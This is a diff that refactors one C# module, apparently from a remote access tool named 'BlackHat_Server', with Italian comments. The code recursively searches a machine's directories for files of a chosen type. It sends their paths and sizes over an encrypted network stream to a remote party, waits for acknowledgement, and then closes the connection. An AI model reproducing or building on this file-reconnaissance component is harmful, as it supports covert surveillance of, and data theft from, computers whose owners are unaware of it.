@@ -1,28 +1,23 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Text;
+﻿using System.Collections.Generic;
 using System.IO;
 using System.Net.Sockets;
-using System.Windows.Forms;
 
 namespace BlackHat_Server
 {
-    class Search
+    internal class Search
     {
-        NetworkStream myNetWork;
-        bool stopMe = false;
-        
+        private readonly NetworkStream myNetWork;
+        private bool stopMe;
 
-       
 
         public Search(NetworkStream ctor_Net)
         {
             myNetWork = ctor_Net;
         }
 
-        
+
         /// <summary>
-        /// Lista dei Files Recursive in Sdir
+        ///     Lista dei Files Recursive in Sdir
         /// </summary>
         /// <param name="sDir"></param>
         /// <param name="sFileType"></param>
@@ -31,18 +26,16 @@ namespace BlackHat_Server
         {
             if (!stopMe)
             {
-                List<string> listaFiles = new List<string>();
+                var listaFiles = new List<string>();
 
-                string[] dirs = Directory.GetDirectories(sDir);
+                var dirs = Directory.GetDirectories(sDir);
 
-                foreach (string d in dirs)
-                {
-                    
+                foreach (var d in dirs)
                     try
                     {
-                        string[] files = Directory.GetFiles(d, sFileType);
+                        var files = Directory.GetFiles(d, sFileType);
 
-                        foreach (string f in files)
+                        foreach (var f in files)
                             listaFiles.Add(f);
 
                         if (listaFiles.Count > 0)
@@ -52,18 +45,14 @@ namespace BlackHat_Server
 
                         RecursiveSearch(d, sFileType);
                     }
-                    catch { }                   
-                    
-
-                }
+                    catch
+                    {
+                    }
             }
-   
-            
-  
         }
 
         /// <summary>
-        /// Lista dei Files Normal Sdir
+        ///     Lista dei Files Normal Sdir
         /// </summary>
         /// <param name="sDir"></param>
         /// <param name="sFileType"></param>
@@ -72,45 +61,45 @@ namespace BlackHat_Server
         {
             try
             {
-                List<string> listaFiles = new List<string>();
+                var listaFiles = new List<string>();
 
-                string[] files = Directory.GetFiles(sDir, sFileType);
+                var files = Directory.GetFiles(sDir, sFileType);
 
-                foreach (string f in files)
+                foreach (var f in files)
                     listaFiles.Add(f);
 
                 if (listaFiles.Count > 0)
                     SendList(listaFiles);
             }
-            catch {}           
-
-
+            catch
+            {
+            }
         }
 
 
-
         /// <summary>
-        /// Invio gli item presenti nella lista
+        ///     Invio gli item presenti nella lista
         /// </summary>
         private void SendList(List<string> sendingList)
         {
-            string message = "";
-            MsgManager mm = new MsgManager(myNetWork);
+            var message = "";
+            var mm = new MsgManager(myNetWork);
 
             // INVIO RISPOSTA
-            foreach (string file in sendingList)
+            foreach (var file in sendingList)
             {
-                FileInfo fi = new FileInfo(file);
+                var fi = new FileInfo(file);
                 // string fileName = Path.GetFileName(file);
 
-                string fileInfo = String.Format("{0}|{1}*", file, fi.Length);
+                var fileInfo = string.Format("{0}|{1}*", file, fi.Length);
                 message += fileInfo;
             }
+
             //-----------------------------------------
             message = message.TrimEnd('*');
-            bool sent = mm.SendLargeEncryMessage(message, 10000);
+            var sent = mm.SendLargeEncryMessage(message, 10000);
 
-            string ok = mm.WaitForEncryMessageRicorsive(15000);
+            var ok = mm.WaitForEncryMessageRicorsive(15000);
 
             if (ok != "OK")
                 stopMe = true;
@@ -118,13 +107,13 @@ namespace BlackHat_Server
 
 
         /// <summary>
-        /// Mando Messaggio di fine Files e chiude lo strem!
+        ///     Mando Messaggio di fine Files e chiude lo strem!
         /// </summary>
         public void SendStop()
         {
-            string message = "__STOP__";
-            MsgManager mm = new MsgManager(myNetWork);           
-            bool sent = mm.SendLargeEncryMessage(message, 10000);
+            var message = "__STOP__";
+            var mm = new MsgManager(myNetWork);
+            var sent = mm.SendLargeEncryMessage(message, 10000);
             myNetWork.Close();
         }
     }
